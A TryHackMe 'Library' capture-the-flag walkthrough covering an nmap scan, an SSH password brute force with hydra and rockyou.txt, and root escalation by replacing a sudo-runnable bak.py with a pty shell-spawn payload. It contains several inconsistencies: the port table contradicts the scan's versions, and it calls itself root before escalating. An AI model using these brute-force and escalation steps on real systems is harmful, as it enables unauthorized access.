<div align="center">

<img src="https://assets.tryhackme.com/img/THMlogo.png" alt="TryHackMe Logo" width="180"/>

<br/><br/>

<!-- Animated Hacking GIF -->
<img src="https://media.giphy.com/media/RbDKaczqWovIugyJmW/giphy.gif" width="280" alt="Hacking Terminal Animation"/>

<br/><br/>

# 🕵️ Library — TryHackMe Writeup

### *Enumeration · Brute Force · Privilege Escalation*

<br/>

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge&logo=shield&logoColor=white)](https://tryhackme.com)
[![Category](https://img.shields.io/badge/Category-Linux%20%2F%20CTF-blue?style=for-the-badge&logo=linux&logoColor=white)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Completed%20%E2%9C%94-success?style=for-the-badge)](https://tryhackme.com)

</div>

---

## 📋 Table of Contents

| # | Section |
|:---:|:---|
| 1 | [🌐 Initial Reconnaissance — Web & Fuzzing](#-initial-reconnaissance--web--fuzzing) |
| 2 | [🔭 Port Scanning with Nmap](#-port-scanning-with-nmap) |
| 3 | [📂 Enumuration Begins](#-Enumuration-Begins ) |
| 4 | [🔑 SSH Brute Force with Hydra](#-ssh-brute-force-with-hydra) |
| 5 | [🏠 Post-Login Enumeration](#-post-login-enumeration) |
| 6 | [⬆️ Privilege Escalation via `less`](#%EF%B8%8F-privilege-escalation-via-less) |
| 7 | [🏁 Flags](#-flags) |
| 8 | [📝 Key Takeaways](#-key-takeaways) |

---

## 🌐 Initial Reconnaissance — Web & Fuzzing

After getting the ip and connecting to the machine here is the first look in the browser.

![first look](https://miro.medium.com/v2/resize:fit:720/format:webp/1*HvYDkEq-jsG_JeyIWopGYg.png)

## 🔭 Port Scanning with Nmap

```
Nmap scan report for 10.48.159.162
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/15%OT=22%CT=1%CU=41498%PV=Y%DS=3%DC=T%G=Y%TM=6A301C6
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ(SP=107%GCD=1%ISR=10F%TI=Z%
OS:CI=I%II=I%TS=8)SEQ(SP=FE%GCD=1%ISR=110%TI=Z%CI=I%II=I%TS=8)SEQ(SP=FF%GCD
OS:=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8
OS:NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=68DF%W2=68DF%W
OS:3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


**Open ports summary:**

| Port | Service | Version | Notes |
|:---:|:---|:---|:---|
| 22 | SSH | OpenSSH 7.6p1 | Later on Being able to login via ssh |
| 80 | HTTP | Apache 2.4.29 | Robots.txt disallowed entry |


## 📂 Enumuration Begins

After seeing the entries in the Robots.txt We got a hint rockyou.

![rockyou](https://miro.medium.com/v2/resize:fit:640/format:webp/1*cxI-Rv3eRjmW_yt0pkeH5Q.png)


## 🔑 SSH Brute Force with Hydra

Now if we look at this section of the homepage.

![homepage](https://miro.medium.com/v2/resize:fit:720/format:webp/1*HvYDkEq-jsG_JeyIWopGYg.png)

Now if we look down we can see the a name melodias we are assuming it as a username and according to this username we are going to bruteforing this

Using hydra with the username melodias.


Here is the command for the bruteforcing using the hint rockyou as a wordlist name.


```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
```

Now after bruteforcing we got a valid password


## 🏠 Post-Login Enumeration

After login with the cracked password we got the flag just loooking at the current loggedin directroy.

There was a file named user.txt


which contains the flag of user.txt


## ⬆️ Privilege Escalation via  `less`


After login we saw are now currently as a root user.

We need to do privilage escalation.


to do so we finded the wrongly set cronjob but found nothing.

Now its time for the misconfigured permission for the programs.

We are going to do so with the help of

```
sudo -l
```

Now after this we found a entry.


![sudo -l](https://miro.medium.com/v2/resize:fit:720/format:webp/1*CFXxotL5iOuNm1ie8KtYOA.png)


Since this was running the script we need to find the ingredients inside the bak.py file

This sudo -l tells us that we are allowed to execute bak.py as root with the python interepreter.

But here is a twist we dont have the write permission to edit the file.


So we can't edit the file and instead we need a another technique that is

Delete the bak.py file and create a new one. with the content of bak.py

With a payload of rev shell that is being obtained via the gtfobins



Here is our payload

```
python -c ‘import pty; pty.spawn(“/bin/sh”)’
```


And we are replacing the bak.py file with this

```
echo ‘import pty; pty.spawn(“/bin/sh”)’ > bak.py
```

Now when we check 


```
id
```


we got


```
uid=0(root) gid=0(root) groups=0(root)
```

![root](https://miro.medium.com/v2/resize:fit:640/format:webp/1*lesqroCAOoTQV434yWfBmw.png)

Now we could get the root flag.

Since we got the access for the root the location of root flag is at


/root/root.txt
